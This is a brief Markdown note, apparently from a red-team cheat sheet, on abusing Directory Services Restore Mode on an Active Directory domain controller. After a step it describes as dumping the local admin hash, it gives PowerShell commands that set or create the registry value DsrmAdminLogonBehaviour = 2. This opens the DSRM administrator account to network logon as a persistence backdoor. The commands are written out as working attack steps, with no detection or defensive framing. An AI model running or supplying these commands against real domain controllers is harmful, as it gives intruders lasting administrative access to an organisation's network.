# Directory Service Restore Mode (DSRM)

Directory Services Restore Mode (DSRM) is a safe boot mode which allows emergency access to the Domain Controller for database repairs and recovery. When Active Directory is initially setup the Administrator will be prompted for a password to use for DSRM if ever needed.

## NOTE: DSRM creates a local administrator account on the Domain Controller that is different from the Domain administrator account.

## Requirements: Obtain Local Admin hash on the Domain Controller

### After dumping local admin hash on the domain controller, run:

##### Check if key exists

    Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour'

##### If key exists and value is not set to 2

    Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour' -Value 2 -Verbose

##### If key does not exist then create it

    New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour' -Value 2 -PropertyType DWORD -Verbose

